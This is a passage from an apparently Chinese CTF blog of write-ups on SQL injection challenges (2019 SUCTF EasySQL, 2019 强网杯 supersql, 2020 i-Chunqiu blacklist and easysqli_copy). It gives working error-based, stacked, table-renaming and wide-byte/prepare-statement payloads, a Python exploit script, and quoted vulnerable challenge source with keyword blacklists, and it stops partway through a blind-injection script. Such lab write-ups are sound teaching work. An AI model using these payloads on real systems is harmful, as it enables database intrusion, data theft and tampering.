<p>注册界面的username过滤了一些关键字，空格，and，or等</p>
<p>注册一个用户进去后有一个修改密码的功能，尝试注册<code>admin\</code>用户，再登录后修改密码，发现有sql语法报错，于是想到二次注入和爆错注入</p>
<p>payload：<code>admin&quot;||(extractvalue(1,concat(1,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;)))))))#</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20201020140803308.png" alt loading="lazy"></p>
<p>exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://5b2274a0-d780-4303-be2b-eb6066366015.node3.buuoj.cn/"</span>
payload1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Extrader"||(extractvalue(1,concat(1,((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f'))))))#'''</span>
payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Extrader"||(extractvalue(1,concat(1,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('f')))))))#'''</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">reg</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>
        <span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"Extrader"</span>
    <span class="token punctuation">&#125;</span>
    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"register.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"login.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">chapwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'oldpass'</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>
        <span class="token string">'newpass'</span><span class="token punctuation">:</span> <span class="token number">123456</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    e <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"changepwd.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>text<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    reg<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
    log<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
    chapwd<span class="token punctuation">(</span><span class="token punctuation">)</span>
    reg<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
    log<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
    chapwd<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>需要注意flag不在flag表中，在users表中，报错回显有长度限制，过滤了left和right，利用<code>reverse</code>将结果逆序输出可得到flag</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p>
<p>不过这题过滤的东西要多一些，常用的两种方法：</p>
<blockquote>
<p>预编译注入绕过关键词：set、prepare</p>
<p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p>
</blockquote>
<p>都被过滤用不了了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt loading="lazy"></p>
<p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">详</a></p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> FlagHere <span class="token keyword">open</span> <span class="token keyword">as</span> cool<span class="token punctuation">;</span><span class="token keyword">handler</span> cool <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span><span class="token keyword">handler</span> cool <span class="token keyword">read</span> <span class="token keyword">next</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre>

<p>通过以上语句可以得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt loading="lazy"></p>
<h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p>
<ul>
<li>堆叠注入</li>
<li>*的使用</li>
<li>sql_mode 的应用</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt loading="lazy"></p>
<p>听说比赛的时候泄露了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">include_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>

    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>

    <span class="token comment">//GetPara();</span>
    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//die();</span>
    <span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span> Give me your flag, I will tell you if the flag is right. &lt;/ a>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>
        <span class="token comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$BlackList</span><span class="token punctuation">&#125;</span></span>/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//echo $post['query'];</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select "</span><span class="token operator">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"||flag from Flag"</span><span class="token punctuation">;</span>
        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token delimiter important">?></span></span></code></pre>

<p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p>
<p>sql_mode 是一组mysql支持的基本语法及校验规则</p>
<p><strong>mysql中sql_mode值举例：</strong> </p>
<p><strong>STRICT_TRANS_TABLES：</strong> </p>
<blockquote>
<p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p>
</blockquote>
<p><strong>STRICT_ALL_TABLES：</strong> </p>
<blockquote>
<p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p>
</blockquote>
<p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p>
<blockquote>
<p>当存储引擎被禁止或者未解析时，当使用时会报错 </p>
</blockquote>
<p><strong>only_for_group_by：</strong> </p>
<blockquote>
<p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p>
</blockquote>
<p><strong>NO_AUTO_CREATE_USER:</strong> </p>
<blockquote>
<p>禁止创建密码为空的用户 </p>
</blockquote>
<p><strong>NO_ZERO_IN_DATE：</strong> </p>
<blockquote>
<p>在严格模式下，不允许日期和月份为零 </p>
</blockquote>
<p><strong>NO_ZERO_DATE：</strong> </p>
<blockquote>
<p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p>
</blockquote>
<p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p>
<blockquote>
<p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p>
</blockquote>
<p><strong>NO_AUTO_CREATE_USER：</strong> </p>
<blockquote>
<p>禁止GRANT语句创建密码为空的用户 </p>
</blockquote>
<p><strong>PIPES_AS_CONCAT：</strong> </p>
<blockquote>
<p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p>
</blockquote>
<p><strong>ANSI_QUOTES：</strong> </p>
<blockquote>
<p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p>
</blockquote>
<p>于是有注入语句：</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</code></pre>

<p>拼合起来就是：</p>
<pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt loading="lazy"></p>
<p>另外还有一个解就是*的用法：</p>
<p>注入：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">*,1</code></pre>

<p>拼合起来就是：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">select *,1||flag from Flag</code></pre>

<p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt loading="lazy"></p>
<h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入</a></p>
<p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt loading="lazy"></p>
<p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt loading="lazy"></p>
<p>嗯，确实，一个工具有啥灵魂O.O</p>
<p>测试单引号</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt loading="lazy"></p>
<p>接着测试注释：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;--+</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt loading="lazy"></p>
<p>被过滤掉了</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;#</code></pre>

<p>#有效</p>
<p>尝试注入sql查询等语句，提示被过滤</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt loading="lazy"></p>
<p>于是就用到前面提到了堆叠注入</p>
<p>首先列出所有数据库：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show databases;#</code></pre>

<p>列出所有表：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show tables;# </code></pre>

<p>列出表words中的所有列：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from words;#</code></pre>

<p>列出表1919810931114514中所有的列：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from &#96;1919810931114514&#96;;#</code></pre>

<p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p>
<p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p>
<p>这题没有禁用rename和alter</p>
<p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
<blockquote>
<p>rename用来修改表名</p>
<p>用法rename命令格式：rename table 原表名 to 新表名;</p>
</blockquote>
<blockquote>
<p>alter用来删除，添加或修改表字段</p>
<p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p>
</blockquote>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</code></pre>


<p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</code></pre>


<p>最终得到flag：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt loading="lazy"></p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html">参考1</a> ，<a href="https://xz.aliyun.com/t/3950">参考2</a></p>
<p>界面代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=pdotest'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'******'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select balabala from table1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'balabala'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select balabala from table1 where 1=?"</span><span class="token punctuation">;</span>
        <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span></span></code></pre>

<p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p>
<p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p>
<p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p>
<p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p>
<p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p>
<p>写出盲注脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com/?id="</span>
<span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
